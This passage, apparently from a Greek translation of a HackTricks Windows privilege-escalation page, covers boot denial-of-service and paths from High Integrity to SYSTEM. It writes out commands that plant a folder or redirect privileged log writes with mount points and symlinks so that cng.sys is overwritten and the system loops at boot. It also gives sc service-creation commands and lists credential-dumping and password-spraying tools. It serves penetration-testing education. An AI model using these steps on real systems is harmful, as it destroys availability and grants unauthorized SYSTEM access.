Εκμεταλλευτείτε ένα primitive που σας επιτρέπει να **δημιουργήσετε έναν αυθαίρετο φάκελο ως SYSTEM/admin** — ακόμα κι αν **δεν μπορείτε να γράψετε αρχεία** ή **να ορίσετε αδύναμα δικαιώματα**.

Δημιουργήστε έναν **φάκελο** (όχι αρχείο) με το όνομα ενός **κρίσιμου προγράμματος οδήγησης των Windows**, π.χ.:
```
C:\Windows\System32\cng.sys
```

- Αυτή η διαδρομή αντιστοιχεί συνήθως στο `cng.sys`, ένα kernel-mode driver.
- Αν **την προδημιουργήσετε ως φάκελο**, τα Windows αποτυγχάνουν να φορτώσουν τον πραγματικό driver κατά την εκκίνηση.
- Στη συνέχεια, τα Windows προσπαθούν να φορτώσουν το `cng.sys` κατά την εκκίνηση.
- Εντοπίζουν τον φάκελο, **αποτυγχάνουν να εντοπίσουν τον πραγματικό driver** και **κρασάρουν ή διακόπτουν την εκκίνηση**.
- Δεν υπάρχει **εναλλακτική λύση** ούτε **ανάκτηση** χωρίς εξωτερική παρέμβαση (π.χ. επιδιόρθωση εκκίνησης ή πρόσβαση στον δίσκο).

### Από προνομιούχες διαδρομές καταγραφής/αντιγράφων ασφαλείας + OM symlinks σε αυθαίρετη αντικατάσταση αρχείων / boot DoS

Όταν μια **προνομιούχα υπηρεσία** γράφει αρχεία καταγραφής/εξαγωγές σε μια διαδρομή που διαβάζεται από **εγγράψιμο config**, ανακατευθύνετε αυτήν τη διαδρομή με **Object Manager symlinks + NTFS mount points**, ώστε η προνομιούχα εγγραφή να οδηγήσει σε αυθαίρετη αντικατάσταση αρχείων (ακόμη και **χωρίς** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Προϋποθέσεις**
- Το config που αποθηκεύει τη διαδρομή προορισμού είναι εγγράψιμο από τον attacker (π.χ. `%ProgramData%\...\.ini`).
- Δυνατότητα δημιουργίας mount point προς `\RPC Control` και OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Μια προνομιούχα λειτουργία που γράφει σε αυτήν τη διαδρομή (αρχείο καταγραφής, εξαγωγή, αναφορά).

**Παράδειγμα αλυσίδας**
1. Διαβάστε το config για να εντοπίσετε τον προνομιούχο προορισμό καταγραφής, π.χ. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` στο `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Ανακατευθύνετε τη διαδρομή χωρίς admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Περιμένετε να γράψει το log το προνομιούχο component (π.χ. ο admin ενεργοποιεί την επιλογή «send test SMS»). Η εγγραφή πλέον καταλήγει στο `C:\Windows\System32\cng.sys`.
4. Επιθεωρήστε τον overwritten στόχο (hex/PE parser) για να επιβεβαιώσετε την αλλοίωση· η επανεκκίνηση αναγκάζει τα Windows να φορτώσουν την παραποιημένη διαδρομή του driver → **boot loop DoS**. Αυτό ισχύει γενικά και για οποιοδήποτε προστατευμένο αρχείο θα ανοίξει για εγγραφή μια προνομιούχα υπηρεσία.

> Το `cng.sys` συνήθως φορτώνεται από το `C:\Windows\System32\drivers\cng.sys`, αλλά αν υπάρχει αντίγραφο στο `C:\Windows\System32\cng.sys`, μπορεί να γίνει πρώτα απόπειρα φόρτωσής του, καθιστώντας το αξιόπιστο σημείο DoS για αλλοιωμένα δεδομένα.



## **Από High Integrity σε System**

### **Νέα υπηρεσία**

Αν εκτελείτε ήδη μια διεργασία High Integrity, η **διαδρομή προς το SYSTEM** μπορεί να είναι εύκολη: απλώς **δημιουργήστε και εκτελέστε μια νέα υπηρεσία**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Κατά τη δημιουργία ενός service binary, βεβαιωθείτε ότι είναι έγκυρο service ή ότι το binary εκτελεί γρήγορα τις απαραίτητες ενέργειες, καθώς θα τερματιστεί σε 20s αν δεν είναι έγκυρο service.

### AlwaysInstallElevated

Από μια διεργασία High Integrity, μπορείτε να δοκιμάσετε να **ενεργοποιήσετε τις εγγραφές registry του AlwaysInstallElevated** και να **εγκαταστήσετε** ένα reverse shell χρησιμοποιώντας ένα _**.msi**_ wrapper.\
[Περισσότερες πληροφορίες για τα registry keys που εμπλέκονται και για το πώς να εγκαταστήσετε ένα πακέτο _.msi_ εδώ.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Μπορείτε να** [**βρείτε τον κώδικα εδώ**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Αν έχετε αυτά τα token privileges (πιθανότατα θα τα βρείτε σε μια διεργασία High Integrity), θα μπορείτε να **ανοίξετε σχεδόν οποιαδήποτε διεργασία** (εκτός από protected processes) με το SeDebug privilege, να **αντιγράψετε το token** της διεργασίας και να δημιουργήσετε μια **αυθαίρετη διεργασία με αυτό το token**.\
Με αυτή την τεχνική συνήθως **επιλέγετε οποιαδήποτε διεργασία εκτελείται ως SYSTEM με όλα τα token privileges** (_ναι, μπορείτε να βρείτε διεργασίες SYSTEM χωρίς όλα τα token privileges_).\
**Μπορείτε να βρείτε ένα** [**παράδειγμα κώδικα που εκτελεί την προτεινόμενη τεχνική εδώ**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Αυτή την τεχνική χρησιμοποιεί το meterpreter για να κλιμακώσει προνόμια στο `getsystem`. Η τεχνική συνίσταται στη **δημιουργία ενός pipe και έπειτα στη δημιουργία/κατάχρηση ενός service για εγγραφή σε αυτό το pipe**. Στη συνέχεια, ο **server** που δημιούργησε το pipe χρησιμοποιώντας το privilege **`SeImpersonate`** θα μπορεί να **υποδυθεί το token** του client του pipe (του service), αποκτώντας προνόμια SYSTEM.\
Αν θέλετε να [**μάθετε περισσότερα για τα name pipes, διαβάστε αυτό**](#named-pipe-client-impersonation).\
Αν θέλετε να διαβάσετε ένα παράδειγμα για το [**πώς να μεταβείτε από High Integrity σε System χρησιμοποιώντας name pipes, διαβάστε αυτό**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Αν καταφέρετε να **κάνετε hijack ένα dll** που **φορτώνεται** από μια **διεργασία** η οποία εκτελείται ως **SYSTEM**, θα μπορείτε να εκτελέσετε αυθαίρετο κώδικα με αυτά τα δικαιώματα. Επομένως, το Dll Hijacking είναι επίσης χρήσιμο για αυτό το είδος κλιμάκωσης προνομίων και, επιπλέον, είναι **πολύ πιο εύκολο να επιτευχθεί από μια διεργασία High Integrity**, καθώς αυτή θα έχει **write permissions** στους φακέλους που χρησιμοποιούνται για τη φόρτωση dll.\
**Μπορείτε να** [**μάθετε περισσότερα για το Dll hijacking εδώ**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Διαβάστε:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Το καλύτερο εργαλείο για την αναζήτηση vectors τοπικής κλιμάκωσης προνομίων στα Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Ελέγχει για λανθασμένες ρυθμίσεις και ευαίσθητα αρχεία (**[**δείτε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Εντοπίστηκε.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Ελέγχει για πιθανές λανθασμένες ρυθμίσεις και συλλέγει πληροφορίες (**[**δείτε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Ελέγχει για λανθασμένες ρυθμίσεις**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Εξάγει αποθηκευμένες πληροφορίες συνεδριών από PuTTY, WinSCP, SuperPuTTY, FileZilla και RDP. Χρησιμοποιήστε το -Thorough τοπικά.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Εξάγει credentials από το Credential Manager. Εντοπίστηκε.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Κάνει spray τους κωδικούς πρόσβασης που συλλέχθηκαν σε όλο το domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Το Inveigh είναι ένα εργαλείο PowerShell για spoofing ADIDNS/LLMNR/mDNS και man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Βασική απαρίθμηση Windows για privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Αναζητά γνωστά vulnerabilities για privesc (DEPRECATED υπέρ του Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Τοπικοί έλεγχοι **(Απαιτούν δικαιώματα Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Αναζητά γνωστά vulnerabilities για privesc (πρέπει να γίνει compile με VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Απαριθμεί το host αναζητώντας λανθασμένες ρυθμίσεις (περισσότερο εργαλείο συλλογής πληροφοριών παρά privesc) (πρέπει να γίνει compile) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Εξάγει credentials από πολλά λογισμικά (precompiled exe στο github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port του PowerUp σε C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Ελέγχει για λανθασμένες ρυθμίσεις (precompiled executable στο github). Δεν συνιστάται. Δεν λειτουργεί καλά στα Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Ελέγχει για πιθανές λανθασμένες ρυθμίσεις (exe από python). Δεν συνιστάται. Δεν λειτουργεί καλά στα Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Εργαλείο που δημιουργήθηκε με βάση αυτή την ανάρτηση (δεν χρειάζεται accesschk για να λειτουργήσει σωστά, αλλά μπορεί να το χρησιμοποιήσει).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Διαβάζει την έξοδο του **systeminfo** και προτείνει exploits που λειτουργούν (τοπικό python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Διαβάζει την έξοδο του **systeminfo** και προτείνει exploits που λειτουργούν (τοπικό Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Πρέπει να κάνετε compile το project χρησιμοποιώντας τη σωστή έκδοση του .NET ([δείτε αυτό](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Για να δείτε την εγκατεστημένη έκδοση του .NET στο host του θύματος, μπορείτε να εκτελέσετε:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Θεμελιώδεις αρχές κλιμάκωσης προνομίων στα Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Κλιμάκωση προνομίων μέσω εκμετάλλευσης ανεπαρκών δικαιωμάτων φακέλων](http://www.greyhathacker.net/?p=738)
- [3] [Κλιμάκωση προνομίων στα Windows - σκονάκι](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Workshop τοπικής κλιμάκωσης προνομίων σε Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Επιθέσεις στα Windows: Το AT είναι το νέο μαύρο (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Κλιμάκωση προνομίων - Windows - Πλήρης οδηγός OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Κλιμάκωση προνομίων - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Οδηγός κλιμάκωσης προνομίων στα Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Λίστα ελέγχου κλιμάκωσης προνομίων στα Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Κλιμάκωση προνομίων στα Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Μέθοδοι κλιμάκωσης προνομίων στα Windows για pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Phishing με Word VBA macro μέσω SMTP → αποκρυπτογράφηση διαπιστευτηρίων hMailServer → Veeam CVE-2023-27532 για SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) και κλοπή kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Καταδίωξη της Silver Fox: Γάτα και ποντίκι στις σκιές του kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Ευπάθεια προνομιακού συστήματος αρχείων σε σύστημα SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Εργαλεία ελέγχου συμβολικών συνδέσμων – χρήση του CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Ένας σύνδεσμος στο παρελθόν. Κατάχρηση συμβολικών συνδέσμων στα Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (port του Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Οι παγίδες εμπιστοσύνης του Node.js: Επικίνδυνη επίλυση modules στα Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Modules του Node.js: φόρτωση από φακέλους `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Προκλήσεις λίστας ελέγχου C/C++, λυμένες](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Συνάρτηση RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Παραβίαση δυαδικών αρχείων υπηρεσιών](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own με τη Microslop: Συνδυασμός συνθηκών αγώνα CLDFLT και DirectX Kernel για τοπική κλιμάκωση προνομίων στα Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Ένα I/O Ring για να τους κυβερνά όλους: Πλήρης primitive read/write στα Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Κατάχρηση αυθαίρετων διαγραφών αρχείων για κλιμάκωση προνομίων και άλλα χρήσιμα κόλπα](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Κώδικας exploit FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Επιθέσεις WSUS, Μέρος 2: CVE-2020-1013, τοπική κλιμάκωση προνομίων στα Windows 10 ως 1-day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Εξερευνώντας το Credential Manager και το Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - PoC για το CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Αντιπροσωπεία περιορισμένη από πόρους Kerberos όταν μια αλλαγή εικόνας οδηγεί σε κλιμάκωση προνομίων](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Εξαγωγή ιδιωτικών κλειδιών SSH από το SSH Agent των Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Μετατρέποντας τους εταιρικούς διακομιστές ενημερώσεων σε εργοστάσια backdoor (0_o) – Μέρος 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Μετατρέποντας τους εταιρικούς διακομιστές ενημερώσεων σε εργοστάσια backdoor (0_o) – Μέρος 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Κλιμάκωση προνομίων μέσω διαγραφής φακέλου του Microsoft Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
{{#include ../../banners/hacktricks-training.md}}
